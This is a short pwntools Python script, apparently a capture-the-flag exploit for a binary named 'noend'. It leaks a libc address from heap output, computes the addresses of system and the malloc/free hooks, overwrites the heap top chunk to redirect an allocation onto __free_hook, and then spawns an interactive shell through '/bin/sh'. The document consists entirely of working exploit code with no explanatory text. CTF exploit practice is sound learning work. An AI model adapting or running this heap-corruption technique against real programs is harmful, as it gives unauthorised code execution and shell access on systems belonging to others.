from pwn import *
import time
context.log_level='debug'

p=process('./noend')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')

def routine(size,content):
	p.sendline(str(size))
	time.sleep(0.3)
	p.send(content)
	p.recvuntil(content)

routine(0x20,'0gur0')#0
routine(0x30,'0gur1')#1
routine(0x7f,'0gur2')#2
routine(0x20,'0'*8)

data = u64(p.recv()[:8])
offset = 0x7f7c2d6dbb78-0x7f7c2d317000
libc_base = data -offset
sys_addr = libc_base + libc.symbols['system']
log.info('sys_addr:%#x '%sys_addr)


p.sendline(str(libc_base+libc.symbols['__malloc_hook']))
time.sleep(0.3)
p.sendline()
p.recvline()
p.clean()

routine(0x20,'0gur0')#0
routine(0x30,'0gur1')#1
routine(0x7f,'0gur2')#2
routine(0x20,'0'*8)
new_top = u64(p.recv()[:8])
log.info('new_top:%#x '%new_top)


routine(0xf0,p64(sys_addr+libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x8)*(0xf0/8))
p.sendline(str(new_top+1))
time.sleep(0.3)
p.sendline()
p.recvline()
p.clean()

#gdb.attach(p)
routine(libc_base+libc.symbols['__free_hook']-(new_top+0x868+0x20)-0x10,'a'*8)
routine(0x10,'/bin/sh')
p.interactive()
